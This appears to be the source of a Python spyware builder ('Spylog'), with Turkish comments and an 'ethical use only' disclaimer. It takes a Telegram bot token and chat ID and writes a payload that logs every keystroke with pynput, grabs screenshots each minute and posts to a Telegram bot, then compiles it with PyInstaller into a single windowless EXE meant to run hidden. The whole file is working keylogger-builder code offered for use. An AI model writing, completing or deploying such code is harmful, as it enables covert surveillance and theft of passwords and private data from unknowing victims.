# MIT License
# 
# Copyright (c) 2025 RavixR00T
# 
# İzin verilir, ücretsiz olarak, yazılımı kullanmak, kopyalamak, değiştirmek, birleştirmek,
# yayımlamak, dağıtmak, alt lisans vermek ve satmak, aşağıdaki koşullara bağlı olarak:
# 
# 1. Yukarıdaki telif hakkı bildirimi ve bu lisans bildirimi, yazılımın tüm kopyalarında
#    veya önemli bir kısmında yer almalıdır.
# 2. Yazılım, "OLDUĞU GİBİ" sağlanmaktadır, açık ya da zımni hiçbir garanti verilmeksizin,
#    özellikle de satılabilirlik, belirli bir amaca uygunluk ve ihlal etmeme garantileri konusunda.
# 
# Tüm diğer garanti ve yükümlülükler kullanıcıya aittir.


import os
import subprocess
import time
import requests
from pynput import keyboard
from PIL import ImageGrab

def display_ascii_art():
    ascii_art = """
  /$$$$$$                      /$$                          
 /$$__  $$                    | $$                          
| $$  \__/  /$$$$$$  /$$   /$$| $$        /$$$$$$   /$$$$$$ 
|  $$$$$$  /$$__  $$| $$  | $$| $$       /$$__  $$ /$$__  $$
 \____  $$| $$  \ $$| $$  | $$| $$      | $$  \ $$| $$  \ $$
 /$$  \ $$| $$  | $$| $$  | $$| $$      | $$  | $$| $$  | $$
|  $$$$$$/| $$$$$$$/|  $$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$$
 \______/ | $$____/  \____  $$|________/ \______/  \____  $$
          | $$       /$$  | $$                     /$$  \ $$
          | $$      |  $$$$$$/                    |  $$$$$$/
          |__/       \______/                      \______/ 
                                      coded by
                                      RavixR00T
    """
    disclaimer = """
    Bu araç yalnızca etik kullanım için tasarlanmıştır.
    Tüm sorumluluk kullanıcıya aittir.
    """
    print(ascii_art)
    print(disclaimer)

def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message
    }

    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Mesaj başarıyla gönderildi!")
        else:
            print(f"Mesaj gönderme hatası: {response.status_code}")
    except Exception as e:
        print(f"Telegram gönderimi sırasında hata oluştu: {e}")

def exe_dosyasi_olustur():
    print("EXE dosyası oluşturuluyor...")

    bot_token = input("Telegram Bot Token'ınızı girin: ")
    chat_id = input("Telegram Chat ID'nizi girin: ")

    test_message = "Bağlantı başarılı oldu"
    try:
        send_to_telegram(bot_token, chat_id, test_message)
        print("Bağlantı başarılı, mesaj gönderildi!")
    except Exception as e:
        print(f"Bağlantı sırasında hata oluştu: {e}")
        return

    exe_code = f"""
import os
import time
import requests
from pynput import keyboard
from PIL import ImageGrab

log_file = "logfile.txt"
if not os.path.exists(log_file):
    open(log_file, "w").close()

bot_token = "{bot_token}"
chat_id = "{chat_id}"

def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {{
        "chat_id": chat_id,
        "text": message
    }}

    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Mesaj başarıyla gönderildi!")
        else:
            print(f"Mesaj gönderme hatası: {{response.status_code}}")
    except Exception as e:
        print(f"Telegram gönderimi sırasında hata oluştu: {{e}}")

def log_key(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(str(key))

def start_keylogger():
    listener = keyboard.Listener(on_press=log_key)
    listener.start()

def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")

def run_in_background():
    start_keylogger()
    while True:
        send_to_telegram(bot_token, chat_id, "Bir mesaj gönderildi!")
        capture_screenshot()
        time.sleep(60)

if __name__ == "__main__":
    run_in_background()
    """

    with open("background_task.py", "w") as exe_file:
        exe_file.write(exe_code)

    try:
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "background_task.py"], check=True)
        print("EXE dosyası başarıyla oluşturuldu.")
    except subprocess.CalledProcessError as e:
        print(f"EXE oluşturma sırasında hata oluştu: {str(e)}")

if __name__ == "__main__":
    display_ascii_art()
    exe_dosyasi_olustur()
